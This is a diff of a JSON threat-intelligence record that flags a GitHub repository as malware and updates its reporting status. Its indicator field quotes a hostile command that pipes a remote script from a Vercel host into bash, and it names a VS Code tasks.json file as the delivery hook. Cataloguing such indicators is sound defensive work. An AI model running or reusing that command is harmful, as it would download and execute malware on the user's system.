@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:dawit212119/anbessa",
     "kind": "repository",
+    "family": "",
     "id": "dawit212119/anbessa",
     "url": "https://github.com/Dawit212119/anbessa",
     "registry": "github",
@@ -18,8 +19,8 @@
     "iocs": "default-configuration-sandy.vercel.app; https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test; curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash; frontend/.vscode/tasks.json",
     "matched_signatures": "settings/linux?flag=",
     "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag='] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
+    "osm_status": "submitted",
+    "osm_threat_id": "49b2bb11-d83d-4ec2-a7a5-bfece93636f1",
     "first_seen": "hunt-20260928T024937Z",
     "last_seen": "hunt-20260928T024937Z",
     "evidence_file": "repositories/dawit212119_anbessa.json",
